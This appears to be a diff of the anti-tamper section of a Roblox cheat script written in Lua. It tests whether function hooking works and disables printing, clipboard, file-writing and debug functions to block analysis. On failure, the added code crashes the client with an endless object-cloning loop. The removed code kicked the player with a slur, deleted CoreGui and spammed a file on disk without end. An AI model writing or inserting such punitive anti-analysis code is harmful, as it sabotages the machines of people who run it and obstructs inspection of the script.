@@ -1,104 +1,73 @@
-if hookfunc or hookfunction then
-    h = hookfunc or hookfunction
-    function f()
-        ww = true
+local isHooked = false
+local oldbyte = string.byte
+if hookfunction and type(hookfunction) == 'function' then
+	h = hookfunction
+	function f()
+		isHooked = true
+	end;
+	h(string.byte, function()
+		return f()
+	end)
+	string.byte("sssh")
+	if isHooked == false then
+       while true do 
+          for i,v in next, game:GetDescendants() do
+             pcall(function()
+                v:Clone().Parent = workspace
+             end)
+          end
+       end
     end
-
-    h(
-        string.byte,
-        function()
-            return f()
-        end
-    )
-
-    string.byte("sssh")
-
-    if ww ~= true then
-        game.Players.LocalPlayer.Kick(game.Players.LocalPlayer, "fuck off retard")
-        error("...")
-        game.Players.LocalPlayer:Kick("fuck off retard")
-        for i, v in next, game.CoreGui:GetChildren() do
-            v:Destroy()
-        end
-        rconsoleclear()
-        while task.wait() do
-            while task.wait() do
-                appendfile("i like fortnite.txt", "did i mention fortnite")
-            end
-        end
-    end
-end
-
-if hookfunc or hookfunction then
-    h = hookfunc or hookfunction
-    n = setclipboard or toclipboard or clipboard
-    h(
-        print,
-        function()
-            return false
-        end
-    )
-    h(
-        n,
-        function()
-            return false
-        end
-    )
-    h(
-        writefile,
-        function()
-            return false
-        end
-    )
-    h(
-        makefolder,
-        function()
-            return false
-        end
-    )
-    h(
-        rconsoleprint,
-        function()
-            return false
-        end
-    )
-    h(
-        warn,
-        function()
-            return false
-        end
-    )
-    h(
-        error,
-        function()
-            return false
-        end
-    )
-    h(
-        appendfile,
-        function()
-            return false
-        end
-    )
-    if clonefunction or clone_function then
-        rrr = clonefunction or clone_function
-        h(
-            rrr,
-            function()
-                return false
-            end
-        )
-    end
-    if debug.getupvalue or getupvalue then
-        xxf = debug.getupvalue or getupvalue
-        hookfunc(
-            xxf,
-            function()
-                return false
-            end
-        )
-    end
-    hookfunc(rconsolewarn,function()
-      return false
+    h(string.byte,function()
+       return oldbyte
     end)
+end;
+if hookfunction and type(hookfunction) == 'function' then
+	h = hookfunction;
+	n = setclipboard or toclipboard or clipboard;
+    if type(n) ~= 'function' then
+      while true do end
+    end
+	h(print, function()
+		return false
+	end)
+	h(n, function()
+		return false
+	end)
+	h(writefile, function()
+		return false
+	end)
+	h(makefolder, function()
+		return false
+	end)
+	h(rconsoleprint, function()
+		return false
+	end)
+	h(warn, function()
+		return false
+	end)
+	h(error, function()
+		return false
+	end)
+	h(appendfile, function()
+		return false
+	end)
+	if clonefunction and type(clonefunction) == 'function' then
+		rrr = clonefunction
+		h(rrr, function()
+			return false
+		end)
+	end;
+	if debug.getupvalue then
+		xxf = debug.getupvalue
+		h(xxf, function()
+			return false
+		end)
+	end;
+    h(getupvalue,function()
+       return false
+    end)
+	h(rconsolewarn, function()
+		return false
+	end)
 end
